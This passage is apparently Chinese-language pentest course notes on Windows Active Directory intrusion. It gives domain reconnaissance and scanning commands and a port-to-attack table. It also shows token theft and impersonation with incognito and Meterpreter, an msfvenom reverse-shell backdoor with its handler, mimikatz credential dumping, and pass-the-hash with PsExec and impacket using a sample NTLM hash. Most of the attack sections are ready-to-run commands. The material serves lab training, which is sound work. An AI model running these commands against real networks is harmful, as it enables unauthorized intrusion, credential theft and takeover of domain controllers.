<p>Ntdsutil.exe-ntdsutil.exe 是域控制器自带的域数据库管理工具，从 windows Server 2008 开始就默认自带了。因此我们可以通过 ntdsutil.exe 提取出域中所有 的域用户信息 </p>
<p>常见结构:组织单元(OU)、域(DOMAIN)、域树(tree)、域森林(forest)，在域树内的 所有域共享一个活动目录，这个活动目录内的数据分散地存储在各个域内，且每一 个域只存储该域内的数据 </p>
<p>活动目录: </p>
<ol>
<li>帐号集中管理：所有帐号均存在服务器上，方便对帐号的重命名/重置密码。 </li>
<li>软件集中管理：统一推送软件，统一安装网络打印机等。利用软件发布策略分发 软件,可以让用户自由选择安装软件。</li>
<li>环境集中管理：利用 AD 可以统一客户端桌面，IE，TCP/IP 等设置。 </li>
<li>增强安全性：统一部署杀毒软件和扫毒任务，集中化管理用户的计算机权限、统一制订用户密码策略等，可监控网络，资料统一管理。 </li>
<li>更可靠：更少的宕机时间。如：利用 AD 控制用户访问权限，利用群集、负载均衡等技术对文件服务器进行容灾设定，更可靠，宕机时间更少。 </li>
<li>活动目录为 Microsoft 统一管理的基础平台，其它 ISA、Exchange、SMS 等服务都依赖于这个基础平台。</li>
</ol>
<h2 id="内网渗透-1"><a href="#内网渗透-1" class="headerlink" title="内网渗透"></a>内网渗透</h2><h3 id="域信息收集命令"><a href="#域信息收集命令" class="headerlink" title="域信息收集命令"></a>域信息收集命令</h3><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">query user || qwinsta 查看当前在线用户</span><br><span class="line">net user 查看本机用户</span><br><span class="line">net user /domain 查看域用户</span><br><span class="line">net view &amp; net group "domain computers" /domain 查看当前域计算机列表 第二个查的更多</span><br><span class="line">net view /domain 查看有几个域</span><br><span class="line">net view \\\\dc 查看 dc 域内共享文件</span><br><span class="line">net group /domain 查看域里面的组</span><br><span class="line">net group "domain admins" /domain 查看域管</span><br><span class="line">net localgroup administrators /domain /这个也是查域管，是升级为域控时，本地账户也成为域管</span><br><span class="line">net group "domain controllers" /domain 域控</span><br><span class="line">net time /domain	查询时间 这个命令会请求域服务器的时间</span><br><span class="line">net config workstation 当前登录域 - 计算机名 - 用户名</span><br><span class="line">net use \\\\域控(如 pc.xx.com) password /user:xxx.com\username 相当于这个帐号登录域内主机，可访问资源</span><br><span class="line">ipconfig</span><br><span class="line">systeminfo</span><br><span class="line">tasklist /svc</span><br><span class="line">tasklist /S ip /U domain\username /P /V 查看远程计算机 tasklist</span><br><span class="line">net localgroup administrators &amp;&amp; whoami 查看当前是不是属于管理组</span><br><span class="line">netstat -ano</span><br><span class="line">nltest /dclist:xx 查看域控</span><br><span class="line">whoami /all 查看 Mandatory Label uac 级别和 sid 号暗月内部渗透测试</span><br><span class="line">net sessoin 查看远程连接 session (需要管理权限)</span><br><span class="line">net share 共享目录</span><br><span class="line">cmdkey /l 查看保存登陆凭证</span><br><span class="line">echo %logonserver% 查看登陆域</span><br><span class="line">spn –l administrator spn 记录</span><br><span class="line">set 环境变量</span><br><span class="line">dsquery server - 查找目录中的 AD DC/LDS 实例</span><br><span class="line">dsquery user - 查找目录中的用户</span><br><span class="line">dsquery computer 查询所有计算机名称 windows 2003</span><br><span class="line">dir /s *.exe 查找指定目录下及子目录下没隐藏文件</span><br><span class="line">arp -a</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure>



<h3 id="主机发现"><a href="#主机发现" class="headerlink" title="主机发现"></a>主机发现</h3><p>在域内进行横行渗透时，首先要收集主机的端口和 ip 信息 </p>
<p>net view /domain 查询域内的主机信息 </p>
<ol>
<li>发生系统错误 6118 出现这种错误时 Computer Browser 被禁用了 在域管理启用即可</li>
</ol>
<p><img src="https://pic.imgdb.cn/item/66f16888f21886ccc0da8761.png"></p>
<ol start="2">
<li>net view /domain:moonsec</li>
</ol>
<p><img src="https://pic.imgdb.cn/item/66f168b0f21886ccc0daadb2.png"></p>
<ol start="3">
<li>arp -a 查询通信</li>
</ol>
<p><img src="https://pic.imgdb.cn/item/66f168d6f21886ccc0dace84.png"></p>
<ol start="4">
<li>nbtscan 发现主机</li>
</ol>
<p>nbtscan.exe -r 192.168.0.0/24</p>
<p><img src="https://pic.imgdb.cn/item/66f168fbf21886ccc0daf413.png"></p>
<ol start="5">
<li>bat 命令发现主机</li>
</ol>
<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">for /l %i in (1,1,255) do @ping 192.168.0.%i -w 1 -n 1|find /i "ttl="</span><br><span class="line"></span><br><span class="line">解析：</span><br><span class="line"></span><br><span class="line">for /l %i in (1,1,255)：</span><br><span class="line">这个部分创建一个循环，从 1 到 255，每次递增 1。变量 %i 用于在每次迭代中表示当前的数字。</span><br><span class="line">/l 表示这是一个按序列循环的命令。</span><br><span class="line"></span><br><span class="line">do：</span><br><span class="line">do 后面跟的是在每次迭代中要执行的命令。</span><br><span class="line"></span><br><span class="line">@ping 192.168.0.%i -w 1 -n 1：</span><br><span class="line">这是每次循环中要执行的命令。在这里，它将 192.168.0.%i 替换为当前的循环变量（例如，第一次是 192.168.0.1，第二次是 192.168.0.2，依此类推直到 192.168.0.255）。</span><br><span class="line">-w 1 指定超时时间为 1 毫秒。</span><br><span class="line">-n 1 指定发送 1 个数据包。</span><br><span class="line"></span><br><span class="line">| find /i "ttl="：</span><br><span class="line">管道符 | 将 ping 命令的输出传递给 find 命令。</span><br><span class="line">find /i "ttl=" 用于筛选包含 "ttl=" 的行，/i 表示不区分大小写。</span><br><span class="line">"ttl" 是 Time To Live 的缩写，通常出现在 ping 命令的成功响应中，表明目标主机是可达的。</span><br></pre></td></tr></tbody></table></figure>

<p><img src="https://pic.imgdb.cn/item/66f16958f21886ccc0db509b.png"></p>
<ol start="6">
<li>通过 powershell 脚本扫描 IP 地址存活：</li>
</ol>
<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell.exe -exec bypass -Command "Import-Module ./Invoke-TSPingSwee p.ps1;Invoke-TSPingSweep -StartAddress 192.168.1.0 -EndAddress 192.168.1.255" </span><br></pre></td></tr></tbody></table></figure>

<p>脚本下载地址：<a target="_blank" rel="noopener" href="https://gallery.technet.microsoft.com/scriptcenter/Invoke-TSPingSweep-b71f1b9b">https://gallery.technet.microsoft.com/scriptcenter/Invoke-TSPingSweep-b71f1b9b</a></p>
<ol start="7">
<li>用 PowerShell 实现基本的端口扫描功能。</li>
</ol>
<p>针对单个 IP 的多个端口的扫描： </p>
<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PS C:\Users\Bypass&gt; 1..1024 | % {echo ((new-object Net.Sockets.TcpClien t).Connect("192.168.246.44",$_)) "Port $_ is open!"} 2&gt;$null</span><br></pre></td></tr></tbody></table></figure>

<p> 针对某 IP 段中单个端口的扫描：</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">foreach ($ip in 1..20) {Test-NetConnection -Port 80 -InformationLevel " Detailed" 192.168.1.$ip}</span><br></pre></td></tr></tbody></table></figure>



<h4 id="基于-MSF-的内网主机探测"><a href="#基于-MSF-的内网主机探测" class="headerlink" title="基于 MSF 的内网主机探测"></a><strong>基于</strong> MSF <strong>的内网主机探测</strong></h4><p>使用 msf 进行反弹 shell 进行内网渗透时，通过 msf 自带的扫描模块进行快速扫描。</p>
<p>主机存活探测： </p>
<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">使用use来使用模块</span><br><span class="line">例如:</span><br><span class="line">use	auxiliary/scanner/discovery/arp_sweep</span><br><span class="line"></span><br><span class="line">auxiliary/scanner/discovery/arp_sweep 	ARP 扫描 </span><br><span class="line"></span><br><span class="line">auxiliary/scanner/discovery/udp_sweep 	UDP 扫描 </span><br><span class="line"></span><br><span class="line">auxiliary/scanner/netbios/nbname 		NETBIOS 扫描 </span><br><span class="line"></span><br><span class="line">auxiliary/scanner/snmp/snmp_enum 		SNMP 扫描 </span><br><span class="line"></span><br><span class="line">auxiliary/scanner/smb/smb_version 		SMB 扫描 </span><br></pre></td></tr></tbody></table></figure>

<p>端口扫描： </p>
<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">auxiliary/scanner/portscan/ack			TCP ACK 端口扫描 </span><br><span class="line"></span><br><span class="line">auxiliary/scanner/portscan/ftpbounce 	FTP bounce 端口扫描 </span><br><span class="line"></span><br><span class="line">auxiliary/scanner/portscan/syn 			SYN 端口扫描 </span><br><span class="line"></span><br><span class="line">auxiliary/scanner/portscan/tcp 			TCP 端口扫描 </span><br><span class="line"></span><br><span class="line">auxiliary/scanner/portscan/xmas 		TCP XMas 端口扫描</span><br></pre></td></tr></tbody></table></figure>

<p>Nmap </p>
<p>Nmap 是一个端口扫描器，可用于主机发现、端口扫描、版本检测、OS 检测等。 </p>
<p>使用场景：建立 socks 代理，proxychains+Nmap 扫描内网。 </p>
<p>支持多种扫描模式： </p>
<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">-sT: TCP 扫描 </span><br><span class="line">-sS: SYN 扫描 </span><br><span class="line">-sA: ACK 扫描 </span><br><span class="line">-sF：FIN 扫描 </span><br><span class="line">-sU: UDP 扫描 </span><br><span class="line">-sR: RPC 扫描 </span><br><span class="line">-sP: ICMP 扫描 </span><br></pre></td></tr></tbody></table></figure>

<p>快速扫描所有端口：</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sS -p 1-65535 -v 192.168.99.177</span><br></pre></td></tr></tbody></table></figure>

<h4 id="常见端口与服务"><a href="#常见端口与服务" class="headerlink" title="常见端口与服务"></a>常见端口与服务</h4><table>
<thead>
<tr>
<th align="center">端口号</th>
<th align="center">端口说明</th>
<th align="center">攻击技巧</th>
</tr>
</thead>
<tbody><tr>
<td align="center">21/22/69</td>
<td align="center">ftp/tftp：文件传输协 议</td>
<td align="center">爆破\嗅探\溢出\后门</td>
</tr>
<tr>
<td align="center">22</td>
<td align="center">ssh：远程连接</td>
<td align="center">爆破 OpenSSH；28个退格</td>
</tr>
<tr>
<td align="center">23</td>
<td align="center">telnet：远程连接</td>
<td align="center">爆破\嗅探</td>
</tr>
<tr>
<td align="center">25</td>
<td align="center">smtp：邮件服务</td>
<td align="center">邮件伪造</td>
</tr>
<tr>
<td align="center">53</td>
<td align="center">DNS：域名系统</td>
<td align="center">DNS区域传输\DNS劫持\DNS缓存投毒\DNS欺骗\利用DNS隧道技 术刺透防火墙</td>
</tr>
<tr>
<td align="center">67/68</td>
<td align="center">dhcp</td>
<td align="center">劫持\欺骗</td>
</tr>
<tr>
<td align="center">110</td>
<td align="center">pop3</td>
<td align="center">爆破</td>
</tr>
<tr>
<td align="center">139</td>
<td align="center">samba</td>
<td align="center">爆破\未授权访问\远程代码执行</td>
</tr>
<tr>
<td align="center">143</td>
<td align="center">imap</td>
<td align="center">爆破</td>
</tr>
<tr>
<td align="center">161</td>
<td align="center">snmp</td>
<td align="center">爆破</td>
</tr>
<tr>
<td align="center">389</td>
<td align="center">ldap</td>
<td align="center">注入攻击\未授权访问</td>
</tr>
<tr>
<td align="center">445</td>
<td align="center">SMB</td>
<td align="center">远程代码执行</td>
</tr>
<tr>
<td align="center">512/513/514</td>
<td align="center">linux r</td>
<td align="center">直接使用 rlogin</td>
</tr>
<tr>
<td align="center">873</td>
<td align="center">rsync</td>
<td align="center">未授权访问</td>
</tr>
<tr>
<td align="center">1080</td>
<td align="center">socket</td>
<td align="center">爆破：进行内网渗透</td>
</tr>
<tr>
<td align="center">1352</td>
<td align="center">lotus</td>
<td align="center">爆破：弱口令\信息泄漏：源代码</td>
</tr>
<tr>
<td align="center">1433</td>
<td align="center">mssql</td>
<td align="center">爆破：使用系统用户登录\注入攻击</td>
</tr>
<tr>
<td align="center">1521</td>
<td align="center">oracle</td>
<td align="center">爆破：TNS\注入攻击</td>
</tr>
<tr>
<td align="center">2049</td>
<td align="center">nfs</td>
<td align="center">配置不当</td>
</tr>
<tr>
<td align="center">2181</td>
<td align="center">zookeeper</td>
<td align="center">未授权访问</td>
</tr>
<tr>
<td align="center">3306</td>
<td align="center">mysql</td>
<td align="center">爆破\拒绝服务\注入</td>
</tr>
<tr>
<td align="center">3389</td>
<td align="center">rdp</td>
<td align="center">爆破\Shift 后门</td>
</tr>
<tr>
<td align="center">4848</td>
<td align="center">glassfish</td>
<td align="center">爆破：控制台弱口令\ 认证绕过</td>
</tr>
<tr>
<td align="center">5000</td>
<td align="center">sybase/DB2</td>
<td align="center">爆破\注入</td>
</tr>
<tr>
<td align="center">5432</td>
<td align="center">postgresql</td>
<td align="center">缓冲区溢出\注入攻击\ 爆破：弱口令</td>
</tr>
<tr>
<td align="center">5632</td>
<td align="center">pcanywhere</td>
<td align="center">拒绝服务\代码执行</td>
</tr>
<tr>
<td align="center">5900</td>
<td align="center">vnc</td>
<td align="center">爆破：弱口令\认证绕过</td>
</tr>
<tr>
<td align="center">6379</td>
<td align="center">redis</td>
<td align="center">未授权访问\爆破：弱口令</td>
</tr>
<tr>
<td align="center">7001</td>
<td align="center">weblogic</td>
<td align="center">Java 反序列化\控制台弱口令\控制台部署 webshell</td>
</tr>
<tr>
<td align="center">80/443/8080</td>
<td align="center">web</td>
<td align="center">常见 web 攻击\控制台爆破\对应服务器版本漏洞</td>
</tr>
<tr>
<td align="center">8069</td>
<td align="center">zabbix</td>
<td align="center">远程命令执行</td>
</tr>
<tr>
<td align="center">9080</td>
<td align="center">websphere</td>
<td align="center">远程命令执行</td>
</tr>
<tr>
<td align="center">9090</td>
<td align="center">websphere</td>
<td align="center">控制台 爆破：控制台弱口令 \Java 反序列</td>
</tr>
<tr>
<td align="center">9200/9300</td>
<td align="center">elasticsearch</td>
<td align="center">远程代码执行</td>
</tr>
<tr>
<td align="center">11211</td>
<td align="center">memcacache</td>
<td align="center">未授权访问</td>
</tr>
<tr>
<td align="center">27017</td>
<td align="center">mongodb</td>
<td align="center">爆破\未授权访问</td>
</tr>
</tbody></table>
<h3 id="域渗透思路"><a href="#域渗透思路" class="headerlink" title="域渗透思路"></a>域渗透思路</h3><p>通过域成员主机，定位出域控制器 IP 及域管理员账号，利用域成员主机作为跳板，扩大渗透范围，利用域管理员可以登陆域中任何成员主机的特性，定位出域管理员登陆过的主机 IP，设法从域成员主机内存中 dump 出域管理员密码，进而拿下域控制器、渗透整个内网</p>
<h2 id="内网渗透-Token"><a href="#内网渗透-Token" class="headerlink" title="内网渗透 Token"></a><strong>内网渗透</strong> Token</h2><p><strong>令牌</strong>(token)<strong>是系统的临时秘钥，相当于账号和密码</strong>，用来决定是否允许这次请求 和判断这次请求是属于哪一个用户的。它允许你在不提供密码或其他凭证的前提下，<strong>访问网络和系统资源</strong>，这些令牌将持续存在于系统中，除非系统重新启动。 令牌最大的特点就是随机性，不可预测，黑客或软件无法猜测出令牌。 </p>
<p><strong>假冒令牌可以假冒一个网络中的另一个用户进行各类操作。所以当一个攻击者需要域管理员的操作权限时候，需要通过假冒域管理员的令牌进行攻击。</strong></p>
<p><strong>令牌有很多种：</strong> </p>
<ul>
<li>访问令牌(Access Token)：表示访问控制操作主体的系统对象 </li>
<li>会话令牌(Session Token)：是交互会话中唯一的身份标识符 </li>
<li>密保令牌(Security Token)：又叫做认证令牌或硬件令牌，是一种计算机身 份校验的物理设备，例如 U 盾</li>
</ul>
<p>Windows <strong>的</strong> AccessToken <strong>有两种类型：</strong> </p>
<ul>
<li>Delegation Token<strong>：授权令牌，它支持交互式会话登录</strong> (例如本地用户直接 登录、远程桌面登录访问)</li>
<li>Impresonation Token<strong>：模拟令牌，它是非交互的会话</strong> (例如使用 net use 访问共享文件夹)。</li>
</ul>
<p><strong>注：</strong> 两种 token 只在系统重启后清除 具有 Delegation token 的用户在注销后， 该 Token 将变成 Impersonation token，依旧有效</p>
<h3 id="AccessToken-的窃取与利用"><a href="#AccessToken-的窃取与利用" class="headerlink" title="AccessToken 的窃取与利用"></a>AccessToken <strong>的窃取与利用</strong></h3><p>AccessToken <strong>的窃取与利用需要</strong> administrator <strong>管理员权限。也就是说要提权。</strong> </p>
<p>窃取 AccessToken 的方法： </p>
<p>incognito.exe 程序 、InvokeTokenManipulat.ps1 脚本 、MSF 里的 incognito 模块</p>
<h4 id="1-incognito"><a href="#1-incognito" class="headerlink" title="1.incognito"></a>1.incognito</h4><p>程序地址：<a target="_blank" rel="noopener" href="https://labs.mwrinfosecurity.com/assets/BlogFiles/incognito2.zip">https://labs.mwrinfosecurity.com/assets/BlogFiles/incognito2.zip</a> </p>
<p>AccessToken <strong>的列举</strong>(需要 administrator 权限) </p>
<p>incognito.exe list_tokens -u</p>
<p><img src="https://pic.imgdb.cn/item/66f250e7f21886ccc08b2fa6.png"></p>
<p>操作：模拟其他用户的令牌（复制 token）</p>
<p>如果要使用 AccessToken 模拟其他用户，可以使用命令</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">incognito.exe execute -c "完整的 Token 名" cmd.exe </span><br><span class="line">例如：模拟 system 权限用户（提权至 system）： </span><br><span class="line">incognito.exe execute -c "NT AUTHORITY\SYSTEM" cmd.exe </span><br><span class="line">降权至当前用户： </span><br><span class="line">incognito.exe execute -c "当前用户 token" cmd.exe </span><br></pre></td></tr></tbody></table></figure>

<p>获取域普通用户</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">incognito.exe execute -c "moonsec\test" cmd.exe	</span><br></pre></td></tr></tbody></table></figure>

<p><img src="https://pic.imgdb.cn/item/66f2564ef21886ccc08fe2c8.png"></p>
<h4 id="2-MSF-下的-incognito-模块"><a href="#2-MSF-下的-incognito-模块" class="headerlink" title="2.MSF 下的 incognito 模块"></a>2.MSF <strong>下的</strong> incognito <strong>模块</strong></h4><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">use incognito #加载 incognito </span><br><span class="line"></span><br><span class="line">list_tokens -u #列出 AccessToken </span><br><span class="line"></span><br><span class="line">getuid #查看当前 token impersonate_token "NT AUTHORITY\SYSTEM" #模拟 system 用户，getsystem 命令 即实现了该命令。如果要模拟其他用户，将 token 名改为其他用户即可 </span><br><span class="line"></span><br><span class="line">steal_token 1252 #从进程窃取 token </span><br><span class="line"></span><br><span class="line">getsystem #提升至 system 权限 </span><br><span class="line"></span><br><span class="line">rev2self #返回到之前的 AccessToken 权限</span><br></pre></td></tr></tbody></table></figure>

<h4 id="3-msf-令牌实战"><a href="#3-msf-令牌实战" class="headerlink" title="3.msf 令牌实战"></a>3.msf <strong>令牌实战</strong></h4><p>msf 生成后门 </p>
<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/x64/meterpreter/reverse_tcp LPORT=6666 LHOST=192.1 68.0.115 -f exe -o msf.exe </span><br></pre></td></tr></tbody></table></figure>

<p>监听端口 </p>
<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">msfconsole </span><br><span class="line">use exploit/multi/handler </span><br><span class="line">set payload windows/x64/meterpreter/reverse_tcp </span><br><span class="line">set lhost 192.168.0.115 </span><br><span class="line">set lport 6666 </span><br><span class="line">exploit</span><br></pre></td></tr></tbody></table></figure>

<p><img src="https://pic.imgdb.cn/item/66f25acbf21886ccc093a413.png"></p>
<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">use incognito #进入 incognito 模块 </span><br><span class="line">list_tokens -u #列出令牌 </span><br></pre></td></tr></tbody></table></figure>

<p>列出两种令牌 </p>
<p>Delegation Token：也就是授权令牌，它支持交互式登录(例如可以通过远程桌面登录访问) </p>
<p>Impresonation Token：模拟令牌，它是非交互的会话。</p>
<p>伪造令牌</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">impersonate_token 12SERVER-01\Administrator 	#假冒 12server-01\adminst rator 的令牌 </span><br><span class="line">impersonate_token moonsec\\test 				#假冒 moonsec\test 的令牌 </span><br><span class="line">impersonate_token "NT AUTHORITY\SYSTEM"			#假冒 System 的令牌</span><br></pre></td></tr></tbody></table></figure>

<p><img src="https://pic.imgdb.cn/item/66f25b93f21886ccc094700b.png"></p>
<p>除了可以伪造令牌 也可以从进程里窃取令牌，首先使用 ps 命令列出进程 查看进程 用户使用 steal_token pid 窃取令牌就有对应的权限</p>
<p><img src="https://pic.imgdb.cn/item/66f25ce6f21886ccc095e14b.png"></p>
<p>从进程窃取令牌 </p>
<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">steal_token PID</span><br></pre></td></tr></tbody></table></figure>

<img src="https://pic.imgdb.cn/item/66f25d7df21886ccc0969528.png" style="zoom:67%;">

<p>返回之前的token</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rev2self</span><br></pre></td></tr></tbody></table></figure>

<p><img src="https://pic.imgdb.cn/item/66f25dbcf21886ccc096e412.png"></p>
<h2 id="横向渗透"><a href="#横向渗透" class="headerlink" title="横向渗透"></a>横向渗透</h2><h3 id="PTH-pass-the-hash-HASH-传递"><a href="#PTH-pass-the-hash-HASH-传递" class="headerlink" title="PTH(pass-the-hash) HASH 传递"></a>PTH(pass-the-hash) HASH <strong>传递</strong></h3><p>pass-the-hash 在内网渗透中是一种很经典的攻击方式，原理就是攻击者可以直接通过 LM Hash 和 NTLM Hash 访问远程主机或服务，而不用提供明文密码。 </p>
<p>pass the hash 原理： </p>
<ul>
<li>在 Windows 系统中，通常会使用 <strong>NTLM</strong> 身份认证</li>
<li>NTLM 认证不使用明文口令，而是使用口令加密后的 hash 值，hash 值由系统 API 生成(例如 LsaLogonUser)</li>
<li>hash 分为 LM hash 和 NT hash，如果密码长度大于 15，那么无法生成 LM hash。从 Windows Vista 和 Windows Server 2008 开始，微软默认禁用 LM hash</li>
<li>如果攻击者获得了 hash，就能够在身份验证的时候模拟该用户(即跳过调用 API 生成 hash 的过程)</li>
</ul>
<p>这类攻击适用于：</p>
<ul>
<li>域/工作组环境</li>
<li>可以获得 hash，但是条件不允许对 hash 爆破</li>
<li>内网中存在和当前机器相同的密码</li>
</ul>
<p>微软也对 pth 打过补丁，然而在测试中发现，在打了补丁后，常规的 Pass The Hash 已经无法成功，唯独默认的 Administrator(SID 500)账号例外，利用这个账号 仍可以进行 Pass The Hash 远程 ipc 连接。 </p>
<p>如果禁用了 ntlm 认证，PsExec 无法利用获得的 ntlm hash 进行远程连接，但是使 用 mimikatz 还是可以攻击成功。 </p>
<p>从 windows 到 windows 横向 pth 这一类攻击方法比较广泛。</p>
<h4 id="mimitkaz-pth"><a href="#mimitkaz-pth" class="headerlink" title="mimitkaz pth"></a>mimitkaz pth</h4><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">privilege::debug</span><br><span class="line">sekurlsa::logonpasswords</span><br><span class="line"></span><br><span class="line">//导出信息，可以查看SID的NTML</span><br><span class="line">mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"&gt; password.txt</span><br></pre></td></tr></tbody></table></figure>

<p><img src="https://pic.imgdb.cn/item/66f26431f21886ccc09dce74.png"></p>
<p>得到 hash 后进行模拟用户</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">privilege::debug </span><br><span class="line">sekurlsa::pth /user:administrator /domain:workgroup /ntlm:32ed87bdb5fdc5e9cba88547376818d4</span><br><span class="line">//SID的NTML</span><br></pre></td></tr></tbody></table></figure>

<p><img src="https://pic.imgdb.cn/item/66f26566f21886ccc09edde6.png"></p>
<p>成功后 会弹出终端 cmd</p>
<h4 id="psexec"><a href="#psexec" class="headerlink" title="psexec"></a>psexec</h4><p>psexec 是 windows 官方自带的，不会存在查杀问题，属于 pstools 利用 PsExec 可以在远程计算机上执行命令，其基本原理是通过管道在远程目标主机上创建一个 psexec 服务，并在本地磁盘中生成一个名为 PSEXESVC 的二进制文件，然后通过 psexec 服务运行命令，运行结束后删除服务。</p>
<p>利用 SMB 服务可以通过明文或 hash 传递来远程执行，条件 445 服务端口开放。 对方开放 445 端口，就相当于开放了 smb 协议</p>
<p>psexec 第一种：先有 ipc 链接，psexec 需要明文或 hash 传递</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">PsExec64.exe /accepteula /s \\192.168.0.123 -u Administrator -p 123456 cmd</span><br><span class="line">-accepteula 第一次运行 PsExec 会弹出确认框，使用该参数就不会弹出确认框</span><br><span class="line">-s 以 System 权限运行远程进程，如果不用这个参数，就会获得一个对应用户权限的 shell</span><br><span class="line">直接执行回显</span><br><span class="line">-u 域\用户名</span><br><span class="line">-p 密码</span><br><span class="line">PsExec.exe /accepteula /s \\192.168.0.141 -u Administrator -p 123456 cmd /c "ipconfig"</span><br></pre></td></tr></tbody></table></figure>

<p><img src="https://pic.imgdb.cn/item/66f2d768f21886ccc011688a.png"></p>
<p>下图建立在明文之上</p>
<p><img src="https://pic.imgdb.cn/item/66f2d7b9f21886ccc011d5d9.png"></p>
<p>下图是在 hash 下进行登录</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">psexec -hashes aad3b435b51404eeaad3b435b51404ee:32ed87bdb5fdc5e9cba88547376818d4 ./Administrator@192.168.0.123</span><br></pre></td></tr></tbody></table></figure>

<p><img src="https://pic.imgdb.cn/item/66f2d802f21886ccc012340b.png"></p>
<p>出现这个错误可以使用 impacket 这个工具包下的 psexec 进行利用</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:32ed87bdb5fdc5e9cba88547376818d4 ./Administrator@192.168.0.123</span><br></pre></td></tr></tbody></table></figure>

<p><img src="https://pic.imgdb.cn/item/66f2d8cbf21886ccc01325b4.png"></p>
<p>在使用 PsExec 时需要注意以下几点：</p>
<ul>
<li>需要远程系统开启 admin 共享（默认是开启的）</li>
<li>因为 PsExec 连接的原理是基于 IPC 共享，因此目标需要开放 445 端口</li>
<li>在使用 IPC$ 连接目标系统后，不需要输入账户和密码。</li>
